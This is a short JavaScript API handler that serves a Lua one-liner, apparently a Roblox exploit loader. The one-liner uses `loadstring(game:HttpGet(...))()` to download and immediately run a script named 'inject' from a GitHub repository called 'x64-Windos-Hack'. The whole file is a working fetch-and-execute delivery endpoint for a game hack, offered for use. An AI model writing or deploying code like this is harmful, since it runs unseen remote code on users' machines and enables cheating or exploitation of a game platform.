export default function handler(req, res) {
  const luaResponse = `return "loadstring(game:HttpGet(\\"https://raw.githubusercontent.com/SrDark222/x64-Windos-Hack/refs/heads/main/inject\\"))()"`;
  res.status(200).json({ script: luaResponse });
}
